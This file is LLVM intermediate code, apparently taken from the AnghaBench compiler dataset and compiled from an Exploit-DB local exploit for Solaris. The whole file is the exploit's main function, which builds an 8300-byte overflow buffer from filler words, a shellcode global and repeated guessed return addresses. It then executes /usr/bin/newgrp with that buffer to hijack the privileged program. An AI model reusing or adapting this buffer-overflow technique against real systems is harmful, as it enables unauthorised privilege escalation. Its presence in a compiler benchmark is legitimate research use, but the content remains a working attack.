; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/solaris/local/extr_247.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/solaris/local/extr_247.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [23 x i8] c"Jumping to address %p\0A\00", align 1
@shell = common dso_local global i8* null, align 8
@.str.1 = private unnamed_addr constant [16 x i8] c"/usr/bin/newgrp\00", align 1
@.str.2 = private unnamed_addr constant [7 x i8] c"newgrp\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @main() #0 {
  %1 = alloca i64*, align 8
  %2 = alloca i64, align 8
  %3 = alloca [8300 x i8], align 16
  %4 = alloca i32, align 4
  %5 = call i32 (...) @get_sp()
  %6 = sub nsw i32 %5, 8096
  %7 = sext i32 %6 to i64
  store i64 %7, i64* %2, align 8
  %8 = load i64, i64* %2, align 8
  %9 = call i32 @printf(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str, i64 0, i64 0), i64 %8)
  %10 = getelementptr inbounds [8300 x i8], [8300 x i8]* %3, i64 0, i64 0
  %11 = bitcast i8* %10 to i64*
  store i64* %11, i64** %1, align 8
  store i32 0, i32* %4, align 4
  br label %12

12:                                               ; preds = %18, %0
  %13 = load i32, i32* %4, align 4
  %14 = icmp slt i32 %13, 2050
  br i1 %14, label %15, label %21

15:                                               ; preds = %12
  %16 = load i64*, i64** %1, align 8
  %17 = getelementptr inbounds i64, i64* %16, i32 1
  store i64* %17, i64** %1, align 8
  store i64 2786902035, i64* %16, align 8
  br label %18

18:                                               ; preds = %15
  %19 = load i32, i32* %4, align 4
  %20 = add nsw i32 %19, 1
  store i32 %20, i32* %4, align 4
  br label %12

21:                                               ; preds = %12
  store i32 0, i32* %4, align 4
  br label %22

22:                                               ; preds = %37, %21
  %23 = load i32, i32* %4, align 4
  %24 = load i8*, i8** @shell, align 8
  %25 = call i32 @strlen(i8* %24)
  %26 = icmp slt i32 %23, %25
  br i1 %26, label %27, label %40

27:                                               ; preds = %22
  %28 = load i8*, i8** @shell, align 8
  %29 = load i32, i32* %4, align 4
  %30 = sext i32 %29 to i64
  %31 = getelementptr inbounds i8, i8* %28, i64 %30
  %32 = load i8, i8* %31, align 1
  %33 = load i32, i32* %4, align 4
  %34 = add nsw i32 104, %33
  %35 = sext i32 %34 to i64
  %36 = getelementptr inbounds [8300 x i8], [8300 x i8]* %3, i64 0, i64 %35
  store i8 %32, i8* %36, align 1
  br label %37

37:                                               ; preds = %27
  %38 = load i32, i32* %4, align 4
  %39 = add nsw i32 %38, 1
  store i32 %39, i32* %4, align 4
  br label %22

40:                                               ; preds = %22
  %41 = getelementptr inbounds [8300 x i8], [8300 x i8]* %3, i64 0, i64 8160
  %42 = bitcast i8* %41 to i64*
  store i64* %42, i64** %1, align 8
  store i32 0, i32* %4, align 4
  br label %43

43:                                               ; preds = %50, %40
  %44 = load i32, i32* %4, align 4
  %45 = icmp slt i32 %44, 30
  br i1 %45, label %46, label %53

46:                                               ; preds = %43
  %47 = load i64, i64* %2, align 8
  %48 = load i64*, i64** %1, align 8
  %49 = getelementptr inbounds i64, i64* %48, i32 1
  store i64* %49, i64** %1, align 8
  store i64 %47, i64* %48, align 8
  br label %50

50:                                               ; preds = %46
  %51 = load i32, i32* %4, align 4
  %52 = add nsw i32 %51, 1
  store i32 %52, i32* %4, align 4
  br label %43

53:                                               ; preds = %43
  %54 = getelementptr inbounds [8300 x i8], [8300 x i8]* %3, i64 0, i64 8280
  store i8 0, i8* %54, align 8
  %55 = getelementptr inbounds [8300 x i8], [8300 x i8]* %3, i64 0, i64 0
  %56 = call i32 @execl(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.1, i64 0, i64 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.2, i64 0, i64 0), i8* %55, i8* null)
  ret void
}

declare dso_local i32 @get_sp(...) #1

declare dso_local i32 @printf(i8*, i64) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @execl(i8*, i8*, i8*, i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
